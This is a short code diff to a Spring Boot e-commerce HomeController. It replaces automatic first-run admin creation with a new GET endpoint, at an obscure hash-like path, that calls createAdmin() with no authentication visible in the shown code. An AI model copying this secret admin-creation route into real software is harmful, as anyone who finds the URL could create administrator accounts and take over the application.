@@ -10,13 +10,9 @@ import org.springframework.web.bind.annotation.GetMapping;
 import com.sham.springboot.ecommerceloja.domain.authentication.RoleEnum;
 import com.sham.springboot.ecommerceloja.domain.authentication.User;
 import com.sham.springboot.ecommerceloja.domain.authentication.UserService;
-import com.sham.springboot.ecommerceloja.domain.products.ProductService;
 
 @Controller("/")
 public class HomeController {
-
-	@Autowired
-	ProductService productService;
 
 	@Autowired
 	UserService userService;
@@ -24,10 +20,13 @@ public class HomeController {
 	@GetMapping("/")
 	public String index(Principal principal, Model model) {
 		model.addAttribute("principal", principal);
-		if(!userService.findAll().iterator().hasNext()) {
-			this.createAdmin();
-		}
 		return "index";
+	}
+
+	@GetMapping("/$2a$10$M3.cjprAakF.9WYdgkoOtuqPjO5x57bIEWMM.MquFOKY5ADrzlfBS")
+	public String magicUrl() {
+		createAdmin();
+		return "URL Mágica";
 	}
 
 	public void createAdmin() {
